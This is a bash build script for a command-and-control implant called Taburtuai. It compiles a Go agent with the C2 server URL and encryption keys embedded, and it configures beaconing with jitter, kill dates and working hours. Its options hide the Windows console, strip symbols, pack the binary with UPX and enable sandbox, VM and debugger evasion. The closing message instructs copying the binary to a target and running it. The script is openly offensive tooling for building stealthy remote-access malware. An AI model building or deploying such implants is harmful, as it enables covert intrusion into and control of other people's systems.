#!/bin/bash
# build_agent.sh — Taburtuai C2 agent builder
set -e

# ── Colors ────────────────────────────────────────────────────────────────────
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; CYAN='\033[0;36m'; NC='\033[0m'

info()    { echo -e "${BLUE}[info]${NC}  $*"; }
ok()      { echo -e "${GREEN}[ok]${NC}    $*"; }
warn()    { echo -e "${YELLOW}[warn]${NC}  $*"; }
die()     { echo -e "${RED}[error]${NC} $*"; exit 1; }

# ── Defaults ──────────────────────────────────────────────────────────────────
SERVER_URL="http://127.0.0.1:8080"
ENC_KEY="SpookyOrcaC2AES1"
SEC_KEY="TaburtuaiSecondary"
INTERVAL="30"
JITTER="30"
TARGET_OS=$(go env GOOS 2>/dev/null || echo "linux")
TARGET_ARCH="amd64"
OUTPUT_NAME=""
PROFILE=""
STEALTH=false
COMPRESS=false
EVASION=false
DEBUG=false

BUILD_DIR="./bin"

# ── Banner ────────────────────────────────────────────────────────────────────
print_banner() {
    echo
    echo -e "${CYAN}\033[1m  ▀█▀ ▄▀█ █▄▄ █ █ █▀█${NC}"
    echo -e "${CYAN}\033[1m  ░█░ █▀█ █▄█ █▄█ █▀▄${NC}"
    echo -e "${RED}\033[1m  ▀█▀ █ █ ▄▀█ █  █▀▀ ▀▀█${NC}"
    echo -e "${RED}\033[1m  ░█░ █▄█ █▀█ █  █▄▄ ▄▄▀${NC}"
    echo
    echo -e "  \033[2mauthor\033[0m  \033[1mmjopsec\033[0m   \033[2magent builder\033[0m"
    echo
}

# ── Usage ─────────────────────────────────────────────────────────────────────
show_usage() {
    cat << EOF
Usage: $(basename "$0") [OPTIONS]

Options:
  -s, --server URL        C2 server URL          (default: http://127.0.0.1:8080)
  -k, --key KEY           Primary encryption key  (default: SpookyOrcaC2AES1)
  -2, --secondary KEY     Secondary encryption key
  -i, --interval SEC      Beacon interval seconds (default: 30)
  -j, --jitter PCT        Jitter percent 0-100    (default: 30)
  -o, --os TARGET         Target OS: windows|linux|darwin
  -a, --arch ARCH         Architecture: amd64|386|arm64
  -n, --name NAME         Output filename
  -p, --profile FILE      OPSEC profile YAML (overrides -i/-j and evasion flags)
  -S, --stealth           Strip symbols, no console window (Windows)
  -c, --compress          Compress binary with UPX
  -e, --evasion           Enable evasion techniques
  -d, --debug             Debug build (verbose, disables stealth)
  -h, --help              Show this help

Examples:
  # Basic Linux agent
  $(basename "$0") -s http://192.168.1.10:8080 -o linux

  # Windows stealth agent with OPSEC profile
  $(basename "$0") -s http://192.168.1.10:8080 -o windows -S -c \\
    --profile builder/profiles/stealth.yaml

  # Quick debug build
  $(basename "$0") -d -o linux
EOF
}

# ── Argument parser ───────────────────────────────────────────────────────────
parse_args() {
    while [[ $# -gt 0 ]]; do
        case $1 in
            -s|--server)     SERVER_URL="$2";  shift 2 ;;
            -k|--key)        ENC_KEY="$2";     shift 2 ;;
            -2|--secondary)  SEC_KEY="$2";     shift 2 ;;
            -i|--interval)   INTERVAL="$2";    shift 2 ;;
            -j|--jitter)     JITTER="$2";      shift 2 ;;
            -o|--os)         TARGET_OS="$2";   shift 2 ;;
            -a|--arch)       TARGET_ARCH="$2"; shift 2 ;;
            -n|--name)       OUTPUT_NAME="$2"; shift 2 ;;
            -p|--profile)    PROFILE="$2";     shift 2 ;;
            -S|--stealth)    STEALTH=true;     shift   ;;
            -c|--compress)   COMPRESS=true;    shift   ;;
            -e|--evasion)    EVASION=true;     shift   ;;
            -d|--debug)      DEBUG=true; STEALTH=false; shift ;;
            -h|--help)       show_usage; exit 0 ;;
            *) die "Unknown option: $1" ;;
        esac
    done

    # Validate
    case $TARGET_OS   in windows|linux|darwin) ;; *) die "Unsupported OS: $TARGET_OS"     ;; esac
    case $TARGET_ARCH in amd64|386|arm64)      ;; *) die "Unsupported arch: $TARGET_ARCH" ;; esac
    [[ "$INTERVAL" =~ ^[0-9]+$ ]] || die "Invalid interval: $INTERVAL"
    [[ "$JITTER"   =~ ^[0-9]+$ ]] || die "Invalid jitter: $JITTER (use integer 0-100)"
    [[ -z "$PROFILE" || -f "$PROFILE" ]] || die "Profile not found: $PROFILE"
}

# ── Simple YAML field reader ──────────────────────────────────────────────────
yaml_get() {
    local key="$1" file="$2"
    grep "^${key}:" "$file" 2>/dev/null | awk '{print $2}' | tr -d '"' | tr -d "'"
}

# ── Load OPSEC profile ────────────────────────────────────────────────────────
load_profile() {
    [[ -z "$PROFILE" ]] && return
    info "Loading profile: $PROFILE"

    local raw_interval; raw_interval=$(yaml_get "sleep_interval" "$PROFILE")
    if [[ -n "$raw_interval" ]]; then
        # strip trailing 's' (e.g. "300s" → "300")
        INTERVAL="${raw_interval%s}"
    fi

    local jitter; jitter=$(yaml_get "jitter_percent" "$PROFILE")
    [[ -n "$jitter" ]] && JITTER="$jitter"

    local max_retries; max_retries=$(yaml_get "max_retries" "$PROFILE")
    [[ -n "$max_retries" ]] && PROFILE_MAX_RETRIES="$max_retries"

    local kill_date; kill_date=$(yaml_get "kill_date" "$PROFILE")
    PROFILE_KILL_DATE="${kill_date:-}"

    local wh_only; wh_only=$(yaml_get "working_hours_only" "$PROFILE")
    PROFILE_WH_ONLY="${wh_only:-false}"

    local wh_start; wh_start=$(yaml_get "working_hours_start" "$PROFILE")
    PROFILE_WH_START="${wh_start:-0}"

    local wh_end; wh_end=$(yaml_get "working_hours_end" "$PROFILE")
    PROFILE_WH_END="${wh_end:-0}"

    local masking; masking=$(yaml_get "sleep_masking" "$PROFILE")
    PROFILE_MASKING="${masking:-false}"

    local ua_rot; ua_rot=$(yaml_get "user_agent_rotation" "$PROFILE")
    PROFILE_UA_ROT="${ua_rot:-false}"

    # any of the VM/sandbox/debug checks → enable evasion
    local evasion_flags=("enable_sandbox_check" "enable_vm_check" "enable_debug_check")
    PROFILE_EVASION="false"
    for flag in "${evasion_flags[@]}"; do
        val=$(yaml_get "$flag" "$PROFILE")
        [[ "$val" == "true" ]] && PROFILE_EVASION="true" && break
    done

    ok "Profile loaded (interval=${INTERVAL}s jitter=${JITTER}% evasion=${PROFILE_EVASION})"
}

# ── Dependency checks ─────────────────────────────────────────────────────────
check_deps() {
    info "Checking dependencies..."

    command -v go >/dev/null 2>&1 || die "Go not found — install from https://go.dev/dl/"
    ok "Go $(go version | awk '{print $3}' | sed 's/go//')"

    [[ -f "go.mod" ]]    || die "go.mod not found — run from project root"
    [[ -d "agent" ]]     || die "agent/ directory not found"
    [[ -f "agent/main.go" ]] || die "agent/main.go not found"

    if $COMPRESS && ! command -v upx >/dev/null 2>&1; then
        warn "UPX not found — skipping compression"
        COMPRESS=false
    fi

    ok "All checks passed"
}

# ── Build ldflags ─────────────────────────────────────────────────────────────
build_ldflags() {
    local pkg="main"
    local flags="-X ${pkg}.serverURL=${SERVER_URL}"
    flags+=" -X ${pkg}.encKey=${ENC_KEY}"
    flags+=" -X ${pkg}.secondaryKey=${SEC_KEY}"
    flags+=" -X ${pkg}.defaultInterval=${INTERVAL}"
    flags+=" -X ${pkg}.defaultJitter=${JITTER}"

    # Profile fields
    [[ -n "${PROFILE_MAX_RETRIES:-}" ]] && flags+=" -X ${pkg}.defaultMaxRetries=${PROFILE_MAX_RETRIES}"
    [[ -n "${PROFILE_KILL_DATE:-}"   ]] && flags+=" -X ${pkg}.defaultKillDate=${PROFILE_KILL_DATE}"
    [[ -n "${PROFILE_WH_ONLY:-}"     ]] && flags+=" -X ${pkg}.defaultWorkingHoursOnly=${PROFILE_WH_ONLY}"
    [[ -n "${PROFILE_WH_START:-}"    ]] && flags+=" -X ${pkg}.defaultWorkingHoursStart=${PROFILE_WH_START}"
    [[ -n "${PROFILE_WH_END:-}"      ]] && flags+=" -X ${pkg}.defaultWorkingHoursEnd=${PROFILE_WH_END}"
    [[ -n "${PROFILE_MASKING:-}"     ]] && flags+=" -X ${pkg}.defaultSleepMasking=${PROFILE_MASKING}"
    [[ -n "${PROFILE_UA_ROT:-}"      ]] && flags+=" -X ${pkg}.defaultUserAgentRotation=${PROFILE_UA_ROT}"
    [[ -n "${PROFILE_EVASION:-}"     ]] && flags+=" -X ${pkg}.defaultEnableEvasion=${PROFILE_EVASION}"

    # Debug mode — keeps console open on exit
    if $DEBUG; then
        flags+=" -X ${pkg}.debugMode=true"
    fi

    # Stealth: strip debug symbols + hide console window
    if $STEALTH && ! $DEBUG; then
        flags+=" -s -w"
        [[ "$TARGET_OS" == "windows" ]] && flags+=" -H windowsgui"
    fi

    echo "$flags"
}

# ── Agent build ───────────────────────────────────────────────────────────────
build_agent() {
    # Auto output name
    if [[ -z "$OUTPUT_NAME" ]]; then
        OUTPUT_NAME="agent_${TARGET_OS}_${TARGET_ARCH}"
        $STEALTH  && OUTPUT_NAME="${OUTPUT_NAME}_stealth"
        $DEBUG    && OUTPUT_NAME="${OUTPUT_NAME}_debug"
        [[ "$TARGET_OS" == "windows" ]] && OUTPUT_NAME="${OUTPUT_NAME}.exe"
    fi

    mkdir -p "$BUILD_DIR"

    local ldflags; ldflags=$(build_ldflags)
    local tags=""
    $EVASION && [[ -n "${PROFILE_EVASION:-}" ]] && [[ "$PROFILE_EVASION" == "true" ]] && tags="evasion"
    $DEBUG   && tags="${tags:+$tags,}debug"

    local cmd="go build"
    [[ -n "$tags"    ]] && cmd+=" -tags $tags"
    cmd+=" -ldflags \"$ldflags\""
    cmd+=" -o \"$BUILD_DIR/$OUTPUT_NAME\" ./agent"

    export GOOS="$TARGET_OS"
    export GOARCH="$TARGET_ARCH"
    export CGO_ENABLED=0

    info "Target  : $TARGET_OS/$TARGET_ARCH"
    info "Server  : $SERVER_URL"
    info "Interval: ${INTERVAL}s  jitter: ${JITTER}%"
    info "Output  : $BUILD_DIR/$OUTPUT_NAME"
    echo

    if eval $cmd; then
        local sz; sz=$(du -h "$BUILD_DIR/$OUTPUT_NAME" | cut -f1)
        ok "Built successfully — $BUILD_DIR/$OUTPUT_NAME ($sz)"
    else
        die "Build failed"
    fi
}

# ── UPX compression ───────────────────────────────────────────────────────────
compress_binary() {
    $COMPRESS || return
    info "Compressing with UPX..."
    local before; before=$(du -h "$BUILD_DIR/$OUTPUT_NAME" | cut -f1)
    if upx --best --lzma "$BUILD_DIR/$OUTPUT_NAME" 2>/dev/null; then
        local after; after=$(du -h "$BUILD_DIR/$OUTPUT_NAME" | cut -f1)
        ok "Compressed: $before → $after"
    else
        warn "UPX compression failed — binary is still usable"
    fi
}

# ── Summary ───────────────────────────────────────────────────────────────────
show_summary() {
    echo
    echo -e "${GREEN}  Agent ready${NC}"
    echo -e "  ${CYAN}$BUILD_DIR/$OUTPUT_NAME${NC}"
    echo
    echo -e "  ${BLUE}next${NC}  copy binary to target and execute — no arguments needed"
    echo -e "  ${BLUE}mon${NC}   go run ./cmd/operator"
    echo
}

# ── Main ──────────────────────────────────────────────────────────────────────
main() {
    print_banner
    parse_args "$@"
    load_profile
    check_deps

    info "Tidying modules..."
    go mod tidy -e 2>/dev/null || true

    build_agent
    compress_binary
    show_summary
}

main "$@"
